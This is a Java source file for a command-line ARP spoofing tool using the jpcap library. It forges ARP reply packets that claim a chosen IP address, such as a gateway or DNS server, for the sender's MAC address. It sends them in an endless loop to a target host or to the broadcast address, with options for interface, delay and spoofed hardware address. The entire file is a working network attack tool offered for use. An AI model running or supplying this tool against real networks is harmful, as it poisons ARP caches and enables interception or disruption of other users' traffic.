package arpWorks;

import java.io.ByteArrayInputStream;
import java.io.StringWriter;
import java.net.Inet4Address;
import java.net.InetAddress;
import java.net.ServerSocket;
import java.net.Socket;
import java.nio.channels.NetworkChannel;
import java.util.Scanner;

import com.sun.org.apache.xerces.internal.impl.dv.util.HexBin;



//import sun.misc.HexDumpEncoder;
import sun.net.InetAddressCachePolicy;

//import com.sun.corba.se.impl.orbutil.HexOutputStream;
//import com.sun.org.apache.xerces.internal.impl.dv.util.HexBin;
//import com.sun.xml.internal.fastinfoset.algorithm.HexadecimalEncodingAlgorithm;

import jpcap.JpcapCaptor;
import jpcap.JpcapSender;
import jpcap.NetworkInterface;
import jpcap.NetworkInterfaceAddress;
import jpcap.PacketReceiver;
import jpcap.packet.ARPPacket;
import jpcap.packet.EthernetPacket;
import jpcap.packet.Packet;



public class ARPspoof {

	/**
	 * @param args
	 */
	public static  JpcapSender sender;
	public static  	ARPPacket arp = new ARPPacket();
	public static String targetIP=null;
	public static String bcast=null;
	
	public static String usingIP=null;
	public static String mac=null;
	public static Integer msec=1000;							
	public static NetworkInterface dev=null; 
	public static boolean show=false;
	public static Integer i=0;
	
	
	public static void main(String[] args) throws Exception {
		
		 if (!caseing(args)) return;
		
		 NetworkInterface[] devices = JpcapCaptor.getDeviceList();
		 byte[] hwaddr;
		 String[] hw;
		 hwaddr=dev.mac_address;
		
		 if (mac!=null) { 
		 hwaddr = HexBin.decode(mac);
		 }
		 
		 
		
		System.out.println("Spoofing ARP replies from "+usingIP+" to "+targetIP+"  on device  "+dev.name);
		System.out.println("delay is  "+msec+" msec");
		System.out.println("");
		 sender = JpcapSender.openDevice(dev);
		 askARP ask = new askARP();
		 byte[] mac;
		 if (targetIP.equals("bcast")) {
			  mac=new byte[] {(byte)0xff,(byte)0xff,(byte)0xff,(byte)0xff,(byte)0xff,(byte)0xff};
			  for (NetworkInterfaceAddress nia : dev.addresses) {
				  if (bcast!=null) targetIP = bcast; else 
				   if (nia.broadcast!=null)
					   targetIP=nia.broadcast.getHostAddress();
			  }
			  
		} else {
			 mac = ask.ask(targetIP, dev);}
		arp.hardtype = ARPPacket.HARDTYPE_ETHER;
        arp.prototype = ARPPacket.PROTOTYPE_IP;
        arp.operation = ARPPacket.ARP_REPLY;
        
        arp.hlen = 6; 
        arp.plen = 4;
        arp.sender_hardaddr = hwaddr;
        arp.sender_protoaddr = InetAddress.getByName(usingIP).getAddress();
        arp.target_hardaddr =   mac; //0c:60:76:29:ee:7d
       arp.target_protoaddr = InetAddress.getByName(targetIP).getAddress();
        
		EthernetPacket ether = new EthernetPacket();
		ether.dst_mac=mac;
		ether.src_mac=hwaddr;     //devices[dev].mac_address;
		ether.frametype=EthernetPacket.ETHERTYPE_ARP;
		arp.datalink=ether;
	
		
		while (true) {
			sender.sendPacket(arp);
			if (show) {
				i++;
				System.out.println(i+"  "+arp);
			}
			
			Thread.sleep(msec);
		}
	}
	
	
	public void letSpoof() {

			sender.sendPacket(arp);	
			
	}
	
	public static  NetworkInterface parseDev(String name) {
		NetworkInterface[] devices =  JpcapCaptor.getDeviceList();
		for (NetworkInterface dev : devices) {
			String devName = dev.name;
			if (devName.equals(name))
				return dev;
		}
		return null;
	}
	
	
	
	public static  boolean  caseing(String[] arg) { 
		Integer i=0;
		if (arg.length==0) {breaking(); return false;}
		while (i<arg.length) {
			 if (arg[i].equals("-S")) {show=true; i=i+1; continue;} 
			
			 if (arg[i].equals("-hw")) {mac=arg[i+1]; i=i+2; continue;}
			 
			 if (arg[i].equals("-t")) {msec=Integer.parseInt(arg[i+1]); i=i+2; continue;}
			 
			 if (arg[i].equals("-i")) {dev= parseDev(arg[i+1]); i=i+2; continue;}
			 
			 if (arg[i].equals("--dst")) { targetIP=arg[i+1]; i=i+2;; continue;}
			 
			 if (arg[i].equals("--bcast")) { bcast=arg[i+1]; i=i+2;; continue;}
			 
			 if (arg[i].equals("-s")^arg[i].equals("--spoof")) {usingIP=arg[i+1]; i=i+2; continue;}
			 System.out.println("'"+arg[i]+"' unknown argument");  
			 return false;
			
			
			
		}
		if (targetIP==null) {breaking(); return false;}
		if (usingIP==null) {breaking(); return false;}
		if (dev==null) {breaking(); return false;}
		
		return true;
		
			
	}
	
	public static  void breaking() {
		 System.out.println("Using: java -jar  arpspoof.jar [options]");
		 System.out.println("	 -S	[show spoofed packets] (optional)");

		 System.out.println();
		 System.out.println("      --dst	<ip> [ip that will receive spoofed packets]");
		 System.out.println("		[--dst bcast]  make spoofed packets broadcasting");
		 
		 System.out.println();
		 System.out.println("      --bcast	<ip> [set custom broadcast ip, only if '--dst bcast' is set]");
		 
		 System.out.println();
		 System.out.println("-s  --spoof	<ip> [ip that will be using for spoofing, most of all it is GATEWAY or DNS server] ");
		 
		 System.out.println();
		 System.out.println("	-hw	<hw adress> [hw addr that will be using like 'src hw addr' in spoofed packets] (optional)");
		
		 System.out.println();
		 System.out.println("	 -i	 <interface number> ");
		 
		 System.out.println();
		 System.out.println("	 -t	<msec> [delay before each packet] (optional)");
		
			System.out.println();
			System.out.println("created by Aleksandr Zhupanov");
			System.out.println("           exception.box@gmail.com");
			System.out.println();
			System.out.println("Have a nice day!");
		
	}
	
	

}



